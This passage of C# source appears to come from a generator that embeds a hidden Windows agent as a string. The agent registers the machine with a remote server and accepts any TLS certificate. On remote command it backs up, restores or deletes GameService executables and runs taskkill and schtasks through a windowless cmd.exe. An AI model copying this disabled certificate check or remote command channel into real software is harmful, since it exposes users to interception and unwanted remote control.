        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '""') return """";
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.Length)
        {
            char c = json[idx];
            if (c == '\\' && idx+1 < json.Length) { sb.Append(json[idx+1]); idx+=2; continue; }
            if (c == '""') break;
            sb.Append(c); idx++;
        }
        return sb.ToString();
    }

    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;
        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);
        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);
        if (len <= 125) frame.WriteByte((byte)(0x80 | len));
        else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); }
        else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i*8)) & 0xFF)); }
        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        byte[] frameBytes = frame.ToArray();
        lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
    }

    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            lastRecvTicks = DateTime.UtcNow.Ticks;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null;
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static long lastRecvTicks = 0;

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static int IndexOfSeparator(StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        LogDesktop(""Snapshot: creating SslStream for "" + host + "" (Tls12)"");
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        LogDesktop(""Snapshot: calling AuthenticateAsClient Tls12 for "" + host);
        try {
            var task = System.Threading.Tasks.Task.Run((Action)(() => ssl.AuthenticateAsClient(host, null, SslProtocols.None, false)));
            bool ok = task.Wait(timeoutMs);
            if (!ok) {
                LogDesktop(""Snapshot: TLS timeout after "" + timeoutMs + ""ms"");
                try { ssl.Close(); } catch {}
                throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
            }
            if (task.IsFaulted) throw task.Exception.InnerException;
            LogDesktop(""Snapshot: TLS authenticated to "" + host + "" proto="" + ssl.SslProtocol);
            return ssl;
        } catch (Exception ex) {
            LogDesktop(""Snapshot: TLS failed "" + ex.GetType().Name + "": "" + ex.Message);
            try { ssl.Close(); } catch {}
            throw;
        }
    }
}";
    private static readonly int RemotePort = 443;
    private static readonly string LocalHost = ""127.0.0.1"";
    private static readonly int LocalPort = 8052;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    private static volatile Stream activeStream;
    private static Mutex singleInstance;
    private static readonly object desktopLogLock = new object();
    private static readonly object sendLock = new object();

    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceSnapshot.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""taken"") || m.Contains(""reverted"") || m.Contains(""deleted"") || m.Contains(""registered"") || m.Contains(""started"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipStamped(string rawMsg)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try
        {
            if (!dbgInformed) AnnounceDbg(s);
            ShipDbgLine(s, StampFor(rawMsg));
        }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }

    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string fallback = Path.Combine(ExeDir(), fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }

    private static void LogDesktop(string msg)
    {
        try
        {
            ShipStamped(msg);
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceSnapshot.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { File.AppendAllText(p, line); } catch {}
                }
            }
        }
        catch { }
    }

    private static string RootDir()
    {
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");
    }

    private static string BackupsDir()
    {
        return Path.Combine(RootDir(), ""Backups"");
    }

    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return RootDir();
    }

    static void Main(string[] args)
    {
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceSnapshot.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Snapshot Main started, DeviceName="" + DeviceName);
        RunAsync().GetAwaiter().GetResult();
    }

    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameService_Snapshot_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;
            try
            {
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex) { LogDesktop(""remote failed: "" + ex.Message); }
            if (!connected)
            {
                try
                {
                    using (var tcp = new TcpClient())
                    {
                        var fbTask = tcp.ConnectAsync(LocalHost, LocalPort);
                        if (await Task.WhenAny(fbTask, Task.Delay(3000)) != fbTask) throw new TimeoutException(""fallback"");
                        await fbTask;
                        connected = await HandleConnection(tcp.GetStream(), LocalHost + "":"" + LocalPort);
                    }
                }
                catch (Exception ex) { LogDesktop(""fallback failed: "" + ex.Message); }
            }
            await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume bytes from the first WebSocket frame.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask)
                { LogDesktop(""handshake read timed out""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""handshake read failed: "" + ex.Message); return false; }
            if (!respStr.Contains(""101"")) return false;

            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);

            activeStream = stream;
            dbgStream = stream;
            string reg = ""{\""type\"":1,\""target\"":\""RegisterSnapshot\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            AnnounceDbg(stream);
            LogDesktop(""registered as "" + DeviceName);

            CancellationTokenSource cts = new CancellationTokenSource();
            Thread pingThread = new Thread(() =>
            {
                while (!cts.IsCancellationRequested)
                {
                    Thread.Sleep(15000);
                    try { SendWsText(stream, ""{\""type\"":6}\x1e""); }
                    catch { break; }
                }
            });
            pingThread.IsBackground = true;
            pingThread.Start();

            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0)
                    {
                        if (rawJson.IndexOf(""\""WhoAreYou\"""", StringComparison.Ordinal) >= 0 &&
                            rawJson.IndexOf(EscapeJson(DeviceName), StringComparison.Ordinal) >= 0)
                        {
                            dbgInformed = false;
                            AnnounceDbg(stream);
                        }
                        ThreadPool.QueueUserWorkItem(delegate { HandleMessage(stream, rawJson); });
                    }
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            cts.Cancel();
            return true;
        }
        catch { return false; }
        finally { activeStream = null; DbgReset(); }
    }

    private static void HandleMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type != 1) return;
            string target = GetJsonString(jsonStr, ""\""target\"""");
            string tDev = GetJsonStringArray(jsonStr, 0);
            bool mine = string.Equals(tDev, DeviceName, StringComparison.OrdinalIgnoreCase);
            if (!mine && !string.IsNullOrEmpty(tDev)) return;
            LogDesktop(""target: "" + target + "" dev:"" + tDev);
            if (target == ""RequestSnapshotList"")
            {
                SendSnapshotList(stream);
            }
            else if (target == ""TakeSnapshot"")
            {
                ThreadPool.QueueUserWorkItem(delegate { DoTake(stream); });
            }
            else if (target == ""RevertSnapshot"")
            {
                string name = GetJsonStringArray(jsonStr, 1);
                ThreadPool.QueueUserWorkItem(delegate { DoRevert(stream, name); });
            }
            else if (target == ""DeleteSnapshot"")
            {
                string nameD = GetJsonStringArray(jsonStr, 1);
                ThreadPool.QueueUserWorkItem(delegate { DoDelete(stream, nameD); });
            }
        }
        catch (Exception ex) { LogDesktop(""HandleMessage error: "" + ex.Message); }
    }

    // ── Snapshot storage: Backups\snapshot_<n>\ with GameService*.exe copies ──

    private class SnapInfo
    {
        public string Dir;
        public string Name;
        public int Num;
        public DateTime Created;
        public List<string> Files = new List<string>();
    }

    private static List<SnapInfo> EnumerateSnapshots()
    {
        var list = new List<SnapInfo>();
        try
        {
            string root = BackupsDir();
            if (!Directory.Exists(root)) return list;
            foreach (string dir in Directory.GetDirectories(root, ""snapshot_*""))
            {
                try
                {
                    string name = Path.GetFileName(dir);
                    int num;
                    if (!int.TryParse(name.Substring(""snapshot_"".Length), out num)) continue;
                    var si = new SnapInfo { Dir = dir, Name = name, Num = num, Created = Directory.GetLastWriteTimeUtc(dir) };
                    foreach (string f in Directory.GetFiles(dir, ""*.exe""))
                        si.Files.Add(Path.GetFileName(f));
                    list.Add(si);
                }
                catch { }
            }
            list.Sort((a, b) => a.Num.CompareTo(b.Num));
        }
        catch { }
        return list;
    }

    private static void SendSnapshotList(Stream stream)
    {
        try
        {
            var snaps = EnumerateSnapshots();
            StringBuilder arr = new StringBuilder(""["");
            bool first = true;
            foreach (var s in snaps)
            {
                if (!first) arr.Append("","");
                arr.Append(""{\""name\"":\"""" + EscapeJson(s.Name) + ""\"",\""createdAtUtc\"":\"""" + s.Created.ToString(""yyyy-MM-ddTHH:mm:ss.fffZ"") + ""\"",\""files\"":["");
                for (int i = 0; i < s.Files.Count; i++)
                {
                    if (i > 0) arr.Append("","");
                    arr.Append(""\"""" + EscapeJson(s.Files[i]) + ""\"""");
                }
                arr.Append(""]}"");
                first = false;
            }
            arr.Append(""]"");
            string msg = ""{\""type\"":1,\""target\"":\""ReportSnapshotList\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            lock (sendLock) { SendWsText(stream, msg); }
            LogDesktop(""reported "" + snaps.Count + "" snapshot(s)"");
        }
        catch (Exception ex) { LogDesktop(""SendSnapshotList failed: "" + ex.Message); }
    }

    private static void ReportOp(Stream stream, string target, string name, bool ok, string renamed, string message)
    {
        try
        {
            string msg = ""{\""type\"":1,\""target\"":\"""" + target + ""\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(name) + ""\"","" + (ok ? ""true"" : ""false"") + "",\"""" + EscapeJson(renamed ?? """") + ""\"",\"""" + EscapeJson(message ?? """") + ""\""]}\x1e"";
            lock (sendLock) { SendWsText(stream, msg); }
        }
        catch { }
    }

    private static void DoTake(Stream stream)
    {
        try
        {
            string root = BackupsDir();
            Directory.CreateDirectory(root);
            var existing = EnumerateSnapshots();
            int next = 1;
            foreach (var s in existing) if (s.Num >= next) next = s.Num + 1;
            string dir = Path.Combine(root, ""snapshot_"" + next);
            Directory.CreateDirectory(dir);

            int copied = 0;
            foreach (string exe in Directory.GetFiles(ExeDir(), ""GameService*.exe""))
            {
                try
                {
                    File.Copy(exe, Path.Combine(dir, Path.GetFileName(exe)), true);
                    copied++;
                }
                catch { }
            }
            if (copied == 0)
            {
                try { Directory.Delete(dir, true); } catch { }
                ReportOp(stream, ""SnapshotTaken"", ""snapshot_"" + next, false, """", ""No GameService*.exe found to back up."");
                LogDesktop(""take FAILED (no exes)"");
                return;
            }
            ReportOp(stream, ""SnapshotTaken"", ""snapshot_"" + next, true, """", copied + "" file(s)"");
            LogDesktop(""take SUCCESS snapshot_"" + next + "" ("" + copied + "" files)"");
            SendSnapshotList(stream);
        }
        catch (Exception ex)
        {
            ReportOp(stream, ""SnapshotTaken"", ""?"", false, """", ex.Message);
            LogDesktop(""take ERROR: "" + ex.Message);
        }
    }

    private static void StopRelatedTasks(IEnumerable<string> exeNames)
    {
        foreach (string exe in exeNames)
        {
            try
            {
                string task = Path.GetFileNameWithoutExtension(exe);
                if (task == ""GameServiceSnapshot"") continue; // never kill ourselves mid-revert
                RunCmd(""taskkill /f /im "" + exe, 8000);
                RunCmd(""schtasks /run /tn \"""" + task + ""\"""", 8000);
            }
            catch { }
        }
    }

    private static int RunCmd(string args, int timeoutMs)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""cmd.exe"", ""/c "" + args);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            using (var p = Process.Start(psi))
            {
                if (p == null) return -1;
                p.WaitForExit(timeoutMs);
                return p.ExitCode;
            }
        }
        catch { return -1; }
    }

    private static void DoRevert(Stream stream, string name)
    {
        try
        {
            string dir = Path.Combine(BackupsDir(), name ?? """");
            if (!Directory.Exists(dir))
            {
                ReportOp(stream, ""SnapshotReverted"", name, false, """", ""Snapshot not found: "" + name);
                LogDesktop(""revert FAILED (missing) "" + name);
                return;
            }
            var restored = new List<string>();
            foreach (string f in Directory.GetFiles(dir, ""*.exe""))
            {
                string dest = Path.Combine(ExeDir(), Path.GetFileName(f));
                File.Copy(f, dest, true);
                restored.Add(Path.GetFileName(f));
            }
            // Restart touched agents so restored bytes take effect.
            Thread restart = new Thread(() => { Thread.Sleep(700); StopRelatedTasks(restored); });
            restart.IsBackground = true;
            restart.Start();
            ReportOp(stream, ""SnapshotReverted"", name, true, """", restored.Count + "" file(s) restored"");
            LogDesktop(""revert SUCCESS "" + name + "" ("" + restored.Count + "" files)"");
            SendSnapshotList(stream);
        }
        catch (Exception ex)
        {
            ReportOp(stream, ""SnapshotReverted"", name ?? ""?"", false, """", ex.Message);
            LogDesktop(""revert ERROR: "" + ex.Message);
        }
    }

    private static void DoDelete(Stream stream, string name)
    {
        try
        {
            string dir = Path.Combine(BackupsDir(), name ?? """");
            if (!Directory.Exists(dir))
            {
                ReportOp(stream, ""SnapshotDeleted"", name ?? ""?"", false, """", ""Snapshot not found: "" + name);
                LogDesktop(""delete FAILED (missing) "" + name);
                return;
            }
            int deletedNum;
            int.TryParse((name ?? """").Substring(""snapshot_"".Length), out deletedNum);
            Directory.Delete(dir, true);

            // Renumber higher snapshots down (snapshot_8 -> snapshot_7, ...).
            var remaining = EnumerateSnapshots();
            var renames = new List<string>();
            foreach (var s in remaining)
            {
                if (s.Num > deletedNum)
                {
                    string newName = ""snapshot_"" + (s.Num - 1);
                    string newDir = Path.Combine(BackupsDir(), newName);
                    try
                    {
                        Directory.Move(s.Dir, newDir);
                        renames.Add(s.Name + ""->"" + newName);
                    }
                    catch { }
                }
            }
            string renamedStr = string.Join(""|"", renames.ToArray());
            ReportOp(stream, ""SnapshotDeleted"", name, true, renamedStr, """");
            LogDesktop(""delete SUCCESS "" + name + (renamedStr.Length > 0 ? "" renumbered: "" + renamedStr : """"));
            SendSnapshotList(stream);
        }
        catch (Exception ex)
        {
            ReportOp(stream, ""SnapshotDeleted"", name ?? ""?"", false, """", ex.Message);
            LogDesktop(""delete ERROR: "" + ex.Message);
        }
    }

    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else sb.Append(c); } return sb.ToString(); }

    private static int GetJsonInt(string json, string key) { string v = GetJsonString(json, key); int r; return int.TryParse(v, out r) ? r : 0; }

    private static string GetJsonString(string json, string key)
    {
        try
        {
            int i = json.IndexOf(key, StringComparison.Ordinal);
            if (i < 0) return null;
            int col = json.IndexOf(':', i);
            if (col < 0) return null;
            col++;
            while (col < json.Length && (json[col] == ' ' || json[col] == '\t')) col++;
            if (col < json.Length && json[col] == '""')
            {
                int end = json.IndexOf('""', col + 1);
                if (end < 0) return null;
                return json.Substring(col + 1, end - col - 1);
            }
            int r = json.IndexOf(',', col);
            int b = json.IndexOf('}', col);
            int stop = (r < 0) ? b : (b < 0 ? r : Math.Min(r, b));
            if (stop < 0) stop = json.Length;
            return json.Substring(col, stop - col).Trim();
        }
        catch { return null; }
    }

    private static string GetJsonStringArray(string json, int arrayIndex)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        int cur = 0;
        while (idx < json.Length && cur < arrayIndex)
        {
            char c = json[idx];
            if (c == '""')
            {
                idx++;
                while (idx < json.Length) { if (json[idx] == '\\') idx+=2; else if (json[idx] == '""') { idx++; break; } else idx++; }
                cur++;
            }
            else if (c != ' ' && c != ',' && c != '\n' && c != '\r') { cur++; while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++; if (idx < json.Length && json[idx] == ',') idx++; }
            else idx++;
        }
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '""') return """";
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.Length)
        {
            char c = json[idx];
            if (c == '\\' && idx+1 < json.Length) { sb.Append(json[idx+1]); idx+=2; continue; }
            if (c == '""') break;
            sb.Append(c); idx++;
        }
        return sb.ToString();
    }

    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;
        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);
        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);
        if (len <= 125) frame.WriteByte((byte)(0x80 | len));
        else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); }
        else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i*8)) & 0xFF)); }
        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        byte[] frameBytes = frame.ToArray();
        lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
    }

    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            lastRecvTicks = DateTime.UtcNow.Ticks;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null;
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static long lastRecvTicks = 0;

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static int IndexOfSeparator(StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        IAsyncResult ar = ssl.BeginAuthenticateAsClient(host, null, null);
        if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
        {
            try { ssl.Close(); } catch { }
            throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
        }
        ssl.EndAuthenticateAsClient(ar);
        return ssl;
    }
}";
    }

    private string GetShellSourceCode()
    {
